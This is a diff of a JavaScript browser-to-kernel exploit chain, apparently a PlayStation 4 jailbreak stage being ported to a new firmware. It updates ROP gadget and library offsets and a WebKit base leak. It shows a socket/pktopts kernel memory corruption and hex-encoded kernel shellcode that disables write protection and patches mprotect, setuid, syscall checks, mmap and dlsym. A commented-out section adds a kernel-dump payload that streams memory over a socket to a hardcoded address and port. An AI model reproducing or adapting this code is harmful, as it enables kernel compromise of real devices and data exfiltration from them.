@@ -26,44 +26,50 @@ window.stage2 = function () {
 }
 
 gadgetcache = {
-  "mov rsp, rdx; jmp rax": 0x14D8AA8,
+  "mov rsp, rdx; jmp rax": 0x01546E00,
   "ret": 0x0000003C,
-  "ret2": 0x52,
-  "pop rdi": 0x00038DBA,
-  "pop rsi": 0x0008F38A,
-  "pop rdx": 0x001BE024,
-  "pop rcx": 0x00052E59,
-  "pop r8": 0x000179C5,
-  "pop r9": 0x00BB320F,
-  "pop rax": 0x000043F5,
-  "pop rsp": 0x0001E687,
-  "mov [rdi], rax": 0x003ADAEB,
-  "mov rax, [rax]": 0x0006C83A,
-  "mov [rdi], rsi": 0x00023AC2,
-  "infloop": 0x01545EAA,
-  "adc eax, 0": 0x000FA12A,
-  "mov edx, esi": 0x00BE59B9,
-  "mov esi, [rdi]": 0x01056651,
-  "mov rdx, rax": 0x00353B31,
-  "mov rcx, rdx; mov [rsi], rcx": 0x016C6FB5,
-  "add rax, rdx": 0x00209A03,
-  "imul rax, rcx": 0x007E2046,
-  "cmp edx, ecx": 0x013C368B,
-  "mov [rdi], eax": 0x795257,
-  "mov rax, rdi": 0x58D0,
-  "mov rax, r8": 0x2A3B02,
+  "pop rdi": 0x0003A5DF,
+  "pop rsi": 0x00091D11,
+  "pop rdx": 0x0010AC52,
+  "pop rcx": 0x00029451,
+  "pop r8": 0x000188A5,
+  "pop r9": 0x0146FF4F,
+  "pop rax": 0x00004575,
+  "pop rsp": 0x0001F4AD,
+  "mov [rdi], rax": 0x000BEF5C,
+  "mov rax, [rax]": 0x000F1ABA,
+  "mov [rdi], rsi": 0x00024CE2,
+  "infloop": 0x00003B1F, //debug only
+  
+  "mov [rdi], eax": 0x00011C28,
+  "mov rax, r8": 0x002ADD82,
+
+  //branching
+  "mov ebp, [rcx]": 0x029911EC,
+  "sub ebp, edi": 0x0335F9AE,
+  "sub edi, ebp": 0x03475896,
+
+  "adc eax, 0": 0x000FD58A,
+
+  "mov rdx, rax": 0x00362241,
+  "add rax, rdx": 0x00211A83,
+  "imul rax, rcx": 0x008141B6,
 };
 
-var setJmpOffset = 0x8AE2C;
-var setJmpGadget = 0x1438C73; // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];
+var setJmpOffset = 0x8be3c;
+var setJmpGadget = 0x149e6b3; // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];
 
-var longJmpOffset = 0x8AEA8;
-var longJmpGadget = 0x13D98EE; // mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 
-var longJmpGadget_thread = 0x15C609B; //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];
+var longJmpOffset = 0x8beb8;
+var longJmpGadget = 0x143e21e; // mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 
+var longJmpGadget_thread = 0x1635bbb; //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];
 
-var pthread_create_np_offset = 0x1A8C0;
-var pthread_exit_offset = 0x18E80;
-var libk__error_offset = 0x155A0;
+var pthread_create_np_offset = 0x1be40;
+var pthread_exit_offset = 0x1a3c0;
+var libk__error_offset = 0x16700;
+
+var libcint_memset_page_offset = 0x20000;
+var libk_stack_chk_fail_page_offset = 0x10000;
+var libwk_first_vt_entry_offset = 0x804cd0;
 
 window.stage2_ = function () {
   p = window.prim;
@@ -71,7 +77,7 @@ window.stage2_ = function () {
   var textArea = document.createElement("textarea");
   var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
   var textAreaVtable = p.read8(textAreaVtPtr);
-  var webKitBase = p.read8(textAreaVtable).sub32(0x7D3600);
+  var webKitBase = p.read8(textAreaVtable).sub32(libwk_first_vt_entry_offset);
   window.nogc.push(textArea);
 
 
@@ -120,12 +126,12 @@ window.stage2_ = function () {
   var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets2.memset));
   window.libSceLibcInternalBase = libSceLibcInternalBase;
   libSceLibcInternalBase.low &= 0xffffc000;
-  libSceLibcInternalBase.sub32inplace(0x20000);
+  libSceLibcInternalBase.sub32inplace(libcint_memset_page_offset);
 
   var libKernelBase = p.read8(get_jmptgt(gadgets2.stack_chk_fail));
   window.libKernelBase = libKernelBase;
   libKernelBase.low &= 0xffffc000;
-  libKernelBase.sub32inplace(0x10000);
+  libKernelBase.sub32inplace(libk_stack_chk_fail_page_offset);
 
   var fakeVtable = p.malloc32(0x200);
   var original_context = p.malloc32(0x40);
@@ -136,7 +142,7 @@ window.stage2_ = function () {
 
     chain.push(window.gadgets["pop rdx"]);
     chain.push(original_context);
-    chain.push(libSceLibcInternalBase.add32(0x8AEA8)); // longjmp
+    chain.push(libSceLibcInternalBase.add32(longJmpOffset)); // longjmp
 
     p.write8(fakeVtable.add32(0x10), original_context);
     p.write8(fakeVtable.add32(0x8), libSceLibcInternalBase.add32(setJmpOffset));
@@ -348,6 +354,13 @@ window.stage2_ = function () {
     awaitpl();
     return;
   }
+  /*
+  var userland_buffer = p.syscall(477, 0, 0x4A00000, 3, 0x1000, -1, 0);
+  p.syscall(324, 1);
+  alert("u buffer = 0x" + userland_buffer);
+  p.fcall(gadgets2.memset, userland_buffer, 0x00, 0x4A00000);
+  alert("memset");
+*/
   //p.syscall(324, 2);
   //gets calling thr's errno pointer
   const errno_location = p.fcall(libKernelBase.add32(libk__error_offset));
@@ -371,13 +384,8 @@ window.stage2_ = function () {
   const PKTOPTS_RTHDR_OFFSET = 0x68;
   const PKTOPTS_TCLASS_OFFSET = 0xB0;
 
-  const KNOTE_FOP_OFFSET = 0x68;
   const KNOTE_KN_OFFSET = 0x60;
-  const FILTEROPS_DETACH_OFFSET = 0x10;
-
-  const KERNEL_ALLPROC_OFFSET = 0x2382FF8;
-  const KERNEL_SOCKETOPS_OFFSET = 0x19D58F0;
-  const PROC_STRUCT_PID_OFFSET = 0xB0;
+  const KERNEL_SOCKETOPS_OFFSET = 0x153FF80; //kernel offset
 
   const NUM_SPRAY_SOCKS = 0xC8;
   const NUM_LEAK_SOCKS = 0xC8;
@@ -672,8 +680,7 @@ window.stage2_ = function () {
       return ltclass & 0x0000FFFF;
     }
     alert("failed to find rthdr <-> master sock overlap");
-    return -1;
-
+    while(1){}
   }
 
   var leak_kmalloc = function (sz) {
@@ -745,6 +752,7 @@ window.stage2_ = function () {
       }
     }
     alert("failed to find slave");
+    while(1){}
   }
 
   var kernel_read8 = function (addr) {
@@ -877,45 +885,45 @@ window.stage2_ = function () {
       and rax, 0xFFFFFFFFFFFEFFFF
       mov cr0, rax
 
-      //mprotect
-      //FFFFFFFF96DDFC08 6x 90
-      mov dword ptr [rdi + 0x1a3c08], 0x90909090
-      mov word ptr [rdi + 0x1a3c0c], 0x9090
-      //setuid
-      //FFFFFFFF96C90A72    B8 00 00 00 00
-      mov dword ptr [rdi + 0x54a72], 0x000000B8
-      mov byte ptr [rdi + 0x54a76], 0x00
-      //syscall everywhere
-      //FFFFFFFF96C3C493    00 00 00 00
-      //FFFFFFFF96C3C4B1    EB 7D
-      mov dword ptr [rdi + 0x493], 0x00000000
-      mov word ptr [rdi + 0x4b1], 0x7DEB
-      //rwx mmap
-      //FFFFFFFF96D79620 37
-      //FFFFFFFF96D79623 37
-      mov byte ptr [rdi + 0x13d620], 0x37
-      mov byte ptr [rdi + 0x13d623], 0x37
-      //dlsym
-      //FFFFFFFF96E73F3A    e9 c1 01 00 00
-      //FFFFFFFF96EEE620    31 C0 C3
-      mov dword ptr [rdi + 0x237f3a], 0x0001C1E9
-      mov byte ptr [rdi + 0x237f3e], 0x00
-      //syscall 11
-      //FFFFFFFF97CB8820    02 00 00 00 00 00 00 00
-      //FFFFFFFF97CB8828    0xFFFFFFFF96C4F460
-      //FFFFFFFF97CB8848    00 00 00 00 01 00 00 00
+      
+      //log crash? 
+      // mov byte ptr [rdi + 0x77f860], 0xC3
 
-      mov qword ptr[rdi + 0x107c820], 0x0000000000000002
-      mov rsi, 0x13460
+      //rwx mprotect
+      mov dword ptr [rdi + 0x2ee98], 0x90909090
+      mov word ptr [rdi + 0x2ee9c], 0x9090
+
+      //setuid
+      mov dword ptr [rdi + 0x107c2], 0x000000B8
+
+      //syscalls everywhere
+      mov dword ptr [rdi + 0x490], 0
+      mov word ptr [rdi + 0x4b9], 0x9090
+      mov word ptr [rdi + 0x4bd], 0x9090
+      mov word ptr [rdi + 0x4c6], 0xE990
+
+      //rwx mmap
+      mov byte ptr [rdi + 0x3c25d9], 0x37
+      mov byte ptr [rdi + 0x3c25dc], 0x37
+
+      //dlsym
+      mov word ptr [rdi + 0x6390A], 0xE990
+      mov dword ptr [rdi + 0x400130], 0xC3C03148
+      
+
+      //syscall 11
+      mov qword ptr [rdi + 0x1115ed0], 0x2
+      mov rsi, 0xaf8c
       add rsi, rdi
-      mov qword ptr[rdi + 0x107c828], rsi
+      mov qword ptr [rdi + 0x1115ed8], rsi
       mov rsi, 0x0000000100000000
-      mov qword ptr[rdi + 0x107c848], rsi
+      mov qword ptr [rdi + 0x1115ef8], rsi
+
 
       //enable wp
       or rax, 0x10000
       mov cr0, rax
-      xor eax, eax
+      mov rax, 0x8080808080808080
       ret
   */
 
@@ -956,44 +964,47 @@ window.stage2_ = function () {
   exec_writer[21] = 0x48C0200F;
   exec_writer[22] = 0xFEFFFF25;
   exec_writer[23] = 0xC0220FFF;
-  exec_writer[24] = 0x3C0887C7;
-  exec_writer[25] = 0x9090001A;
+  exec_writer[24] = 0xEE9887C7;
+  exec_writer[25] = 0x90900002;
   exec_writer[26] = 0xC7669090;
-  exec_writer[27] = 0x1A3C0C87;
+  exec_writer[27] = 0x02EE9C87;
   exec_writer[28] = 0xC7909000;
-  exec_writer[29] = 0x054A7287;
+  exec_writer[29] = 0x0107C287;
   exec_writer[30] = 0x0000B800;
-  exec_writer[31] = 0x7687C600;
-  exec_writer[32] = 0x0000054A;
-  exec_writer[33] = 0x049387C7;
-  exec_writer[34] = 0x00000000;
-  exec_writer[35] = 0xC7660000;
-  exec_writer[36] = 0x0004B187;
-  exec_writer[37] = 0xC67DEB00;
-  exec_writer[38] = 0x13D62087;
-  exec_writer[39] = 0x87C63700;
-  exec_writer[40] = 0x0013D623;
-  exec_writer[41] = 0x3A87C737;
-  exec_writer[42] = 0xE900237F;
-  exec_writer[43] = 0xC60001C1;
-  exec_writer[44] = 0x237F3E87;
-  exec_writer[45] = 0xC7480000;
-  exec_writer[46] = 0x07C82087;
-  exec_writer[47] = 0x00000201;
-  exec_writer[48] = 0xC6C74800;
-  exec_writer[49] = 0x00013460;
-  exec_writer[50] = 0x48FE0148;
-  exec_writer[51] = 0xC828B789;
-  exec_writer[52] = 0xBE480107;
-  exec_writer[53] = 0x00000000;
-  exec_writer[54] = 0x00000001;
-  exec_writer[55] = 0x48B78948;
-  exec_writer[56] = 0x480107C8;
-  exec_writer[57] = 0x0100000D;
-  exec_writer[58] = 0xC0220F00;
-  exec_writer[59] = 0x8080B848;
-  exec_writer[60] = 0x00008080;
-  exec_writer[61] = 0x90C30000;
+  exec_writer[31] = 0x9087C700;
+  exec_writer[32] = 0x00000004;
+  exec_writer[33] = 0x66000000;
+  exec_writer[34] = 0x04B987C7;
+  exec_writer[35] = 0x90900000;
+  exec_writer[36] = 0xBD87C766;
+  exec_writer[37] = 0x90000004;
+  exec_writer[38] = 0x87C76690;
+  exec_writer[39] = 0x000004C6;
+  exec_writer[40] = 0x87C6E990;
+  exec_writer[41] = 0x003C25D9;
+  exec_writer[42] = 0xDC87C637;
+  exec_writer[43] = 0x37003C25;
+  exec_writer[44] = 0x0A87C766;
+  exec_writer[45] = 0x90000639;
+  exec_writer[46] = 0x3087C7E9;
+  exec_writer[47] = 0x48004001;
+  exec_writer[48] = 0x48C3C031;
+  exec_writer[49] = 0x5ED087C7;
+  exec_writer[50] = 0x00020111;
+  exec_writer[51] = 0xC7480000;
+  exec_writer[52] = 0x00AF8CC6;
+  exec_writer[53] = 0xFE014800;
+  exec_writer[54] = 0xD8B78948;
+  exec_writer[55] = 0x4801115E;
+  exec_writer[56] = 0x000000BE;
+  exec_writer[57] = 0x00000100;
+  exec_writer[58] = 0xB7894800;
+  exec_writer[59] = 0x01115EF8;
+  exec_writer[60] = 0x00000D48;
+  exec_writer[61] = 0x220F0001;
+  exec_writer[62] = 0x80B848C0;
+  exec_writer[63] = 0x80808080;
+  exec_writer[64] = 0xC3808080;
 
 
   p.write8(write_address.add32(0x2), this_master_sock_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
@@ -1007,7 +1018,220 @@ window.stage2_ = function () {
   //alert("kernel payload");
   p.syscall(54, kevent_sock, 0x20001111, 0);
   //alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
+
+
+//kernel dumper payload | generic
+/*
+exec_writer[0] = 0xAAAABF48;
+exec_writer[1] = 0xAAAAAAAA;
+exec_writer[2] = 0xC748AAAA;
+exec_writer[3] = 0x00000007;
+exec_writer[4] = 0xAABF4800;
+exec_writer[5] = 0xAAAAAAAA;
+exec_writer[6] = 0x48AAAAAA;
+exec_writer[7] = 0x000007C7;
+exec_writer[8] = 0xBF480000;
+exec_writer[9] = 0xAAAAAAAA;
+exec_writer[10] = 0xAAAAAAAA;
+exec_writer[11] = 0x0007C748;
+exec_writer[12] = 0x48000000;
+exec_writer[13] = 0xAAAAAABF;
+exec_writer[14] = 0xAAAAAAAA;
+exec_writer[15] = 0xAABE48AA;
+exec_writer[16] = 0xAAAAAAAA;
+exec_writer[17] = 0x48AAAAAA;
+exec_writer[18] = 0x83483789;
+exec_writer[19] = 0x8B4810EC;
+exec_writer[20] = 0x009DE83E;
+exec_writer[21] = 0x89480000;
+exec_writer[22] = 0x89482404;
+exec_writer[23] = 0x00C1E8C7;
+exec_writer[24] = 0x8B480000;
+exec_writer[25] = 0xBE48243C;
+exec_writer[26] = 0xAAAAAAAA;
+exec_writer[27] = 0xAAAAAAAA;
+exec_writer[28] = 0xE8C28948;
+exec_writer[29] = 0x0000000F;
+exec_writer[30] = 0x10C48348;
+exec_writer[31] = 0x8080B848;
+exec_writer[32] = 0x80808080;
+exec_writer[33] = 0x49C38080;
+exec_writer[34] = 0x8948D089;
+exec_writer[35] = 0xE8C149D1;
+exec_writer[36] = 0x495F7403;
+exec_writer[37] = 0x48FF408D;
+exec_writer[38] = 0x7603F883;
+exec_writer[39] = 0x478D483E;
+exec_writer[40] = 0xC6394808;
+exec_writer[41] = 0xC1483574;
+exec_writer[42] = 0x834804EA;
+exec_writer[43] = 0xC031F0E1;
+exec_writer[44] = 0x046F0FF3;
+exec_writer[45] = 0x04110F07;
+exec_writer[46] = 0xC0834806;
+exec_writer[47] = 0xC8394810;
+exec_writer[48] = 0x8D48EE75;
+exec_writer[49] = 0x39491204;
+exec_writer[50] = 0x482774C0;
+exec_writer[51] = 0xC148D089;
+exec_writer[52] = 0x8B4804E0;
+exec_writer[53] = 0x89480714;
+exec_writer[54] = 0x49C30614;
+exec_writer[55] = 0x3103E0C1;
+exec_writer[56] = 0x148B48C0;
+exec_writer[57] = 0x14894807;
+exec_writer[58] = 0xC0834806;
+exec_writer[59] = 0xC0394908;
+exec_writer[60] = 0x48C3EF75;
+exec_writer[61] = 0x4C457FBA;
+exec_writer[62] = 0x01010246;
+exec_writer[63] = 0xF8894809;
+exec_writer[64] = 0x00002548;
+exec_writer[65] = 0x3948FFFC;
+exec_writer[66] = 0x480B7410;
+exec_writer[67] = 0x0040002D;
+exec_writer[68] = 0x10394800;
+exec_writer[69] = 0x48C3F575;
+exec_writer[70] = 0xFF3E448D;
+exec_writer[71] = 0x48DEF748;
+exec_writer[72] = 0x0FC3F021;
+exec_writer[73] = 0x493857B7;
+exec_writer[74] = 0x8566F989;
+exec_writer[75] = 0x485F74D2;
+exec_writer[76] = 0x8D20478B;
+exec_writer[77] = 0xF631FF4A;
+exec_writer[78] = 0xCD148D48;
+exec_writer[79] = 0x00000000;
+exec_writer[80] = 0x48F80148;
+exec_writer[81] = 0x8D48CA29;
+exec_writer[82] = 0x8D4C3848;
+exec_writer[83] = 0x04EBD104;
+exec_writer[84] = 0x38C18348;
+exec_writer[85] = 0x30508B48;
+exec_writer[86] = 0x10788B48;
+exec_writer[87] = 0x28408B48;
+exec_writer[88] = 0x48D70148;
+exec_writer[89] = 0x8D48DAF7;
+exec_writer[90] = 0x48FF0744;
+exec_writer[91] = 0x3948D021;
+exec_writer[92] = 0x420F48C6;
+exec_writer[93] = 0xC88948F0;
+exec_writer[94] = 0x75C83949;
+exec_writer[95] = 0xCE294CD3;
+exec_writer[96] = 0xFF868D48;
+exec_writer[97] = 0x4800003F;
+exec_writer[98] = 0xFFC00025;
+exec_writer[99] = 0xF631C3FF;
+exec_writer[100] = 0xB70FEBEB;
+exec_writer[101] = 0x85663846;
+exec_writer[102] = 0x835274C0;
+exec_writer[103] = 0x034801E8;
+exec_writer[104] = 0x8D482076;
+exec_writer[105] = 0x0000C514;
+exec_writer[106] = 0x29480000;
+exec_writer[107] = 0x468D48C2;
+exec_writer[108] = 0x0C8D4838;
+exec_writer[109] = 0x481FEBD0;
+exec_writer[110] = 0x4810568B;
+exec_writer[111] = 0x8948FA29;
+exec_writer[112] = 0x8B480856;
+exec_writer[113] = 0x89482856;
+exec_writer[114] = 0x89482056;
+exec_writer[115] = 0xC13948C6;
+exec_writer[116] = 0x83481C74;
+exec_writer[117] = 0x834838C0;
+exec_writer[118] = 0x7500087E;
+exec_writer[119] = 0x568B48DA;
+exec_writer[120] = 0x56894828;
+exec_writer[121] = 0xC6894820;
+exec_writer[122] = 0x75C13948;
+exec_writer[123] = 0x90C3C3E5;
+
+p.write8(write_address.add32(0x2), this_master_sock_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
+p.write8(write_address.add32(0x13), this_overlapped_socket_pktopts_address.add32(PKTOPTS_RTHDR_OFFSET));
+p.write8(write_address.add32(0x24), pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET));
+p.write8(write_address.add32(0x35), knote_kn.add32(0x8));
+p.write8(write_address.add32(0x3F), socketops_ptr);
+p.write8(write_address.add32(0x68), userland_buffer);
+
+  p.write8(fake_sockopts.add32(0x18), exec_address);
+  alert("kernel payload");
+  p.syscall(54, kevent_sock, 0x20001111, 0);
+  alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
+
+
+//
+//  buffer -> socket -> pc (port 9011)
+//
+exec_writer[0] = 0x0210B848;
+exec_writer[1] = 0xA8C03323;//low word port | hi word ip
+exec_writer[2] = 0x5541E201;// low word ip
+exec_writer[3] = 0x5441D231;
+exec_writer[4] = 0xDDDDBC49;
+exec_writer[5] = 0xDDDDDDDD;
+exec_writer[6] = 0x4855DDDD;
+exec_writer[7] = 0x02BFFD89;
+exec_writer[8] = 0x53000000;
+exec_writer[9] = 0xBEF38948;
+exec_writer[10] = 0x00000001;
+exec_writer[11] = 0x28EC8348;
+exec_writer[12] = 0x24448948;
+exec_writer[13] = 0xAAB84810;
+exec_writer[14] = 0xAAAAAAAA;
+exec_writer[15] = 0xC7AAAAAA;
+exec_writer[16] = 0x010C2444;
+exec_writer[17] = 0x48000000;
+exec_writer[18] = 0x182444C7;
+exec_writer[19] = 0x00000000;
+exec_writer[20] = 0x10BAD0FF;
+exec_writer[21] = 0x48000000;
+exec_writer[22] = 0x1024748D;
+exec_writer[23] = 0x89C58941;
+exec_writer[24] = 0xBBB848C7;
+exec_writer[25] = 0xBBBBBBBB;
+exec_writer[26] = 0xFFBBBBBB;
+exec_writer[27] = 0x04B841D0;
+exec_writer[28] = 0x48000000;
+exec_writer[29] = 0x0C244C8D;
+exec_writer[30] = 0xBAEF8944;
+exec_writer[31] = 0x00000001;
+exec_writer[32] = 0x000006BE;
+exec_writer[33] = 0xCCB84800;
+exec_writer[34] = 0xCCCCCCCC;
+exec_writer[35] = 0xFFCCCCCC;
+exec_writer[36] = 0xDB8548D0;
+exec_writer[37] = 0xDA892374;
+exec_writer[38] = 0xFFFB8148;
+exec_writer[39] = 0x7600000F;
+exec_writer[40] = 0x1000BA05;
+exec_writer[41] = 0x89480000;
+exec_writer[42] = 0xEF8944EE;
+exec_writer[43] = 0x48D4FF41;
+exec_writer[44] = 0xC5014898;
+exec_writer[45] = 0x75C32948;
+exec_writer[46] = 0xEEB848DD;
+exec_writer[47] = 0xEEEEEEEE;
+exec_writer[48] = 0x44EEEEEE;
+exec_writer[49] = 0xD0FFEF89;
+exec_writer[50] = 0x28C48348;
+exec_writer[51] = 0x5D5BC031;
+exec_writer[52] = 0x5D415C41;
+exec_writer[53] = 0x909090C3;
+
+p.write8(write_address.add32(0x12), window.syscalls[4]);
+p.write8(write_address.add32(0xEA), window.syscalls[6]);
+p.write8(write_address.add32(0x37), window.syscalls[97]);
+p.write8(write_address.add32(0x63), window.syscalls[98]);
+p.write8(write_address.add32(0x87), window.syscalls[105]);
+
+alert("calling the thing");
+p.fcall(exec_address, userland_buffer, 0x4A00000);
+alert("made it out alive");
+alert("done");
   //p.syscall(325);
+*/
+
+  //alert("test - close browser");
   p.write8(0, 0); //kill browser
   while (true) {}
 
